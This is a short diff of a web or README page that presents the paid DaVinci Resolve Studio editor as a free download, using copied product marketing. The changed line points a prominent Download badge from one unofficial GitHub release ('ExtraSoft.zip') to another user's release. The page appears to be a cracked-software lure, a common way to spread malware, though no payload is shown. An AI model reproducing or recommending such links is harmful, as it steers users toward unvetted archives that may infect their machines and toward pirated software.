@@ -9,5 +9,5 @@
 <p><strong>Description:
 DaVinci Resolve is the world's only solution for editing and color correction, visual effects overlay, graphics creation and audio post-processing in a single software environment. Its modern, stylish interface is simple and intuitive enough for both new and experienced users. DaVinci Resolve allows you to significantly optimize the creative process, because mastering several applications or switching between different systems is not required. Thus, it is possible to work with the original image of high quality. In essence, DaVinci Resolve combines all the attributes of a post-production studio. Now you have access to the DaVinci Resolve tools used in Hollywood!</p>
 </ol>
-<a href="https://github.com/kevinkenfack/DaVinci-Resolve-Studio-Free/releases/download/DV/ExtraSoft.zip">
+<a href="https://github.com/Wajackoya/DaVinci-Resolve-Studio/releases/tag/DOWNLOAD">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
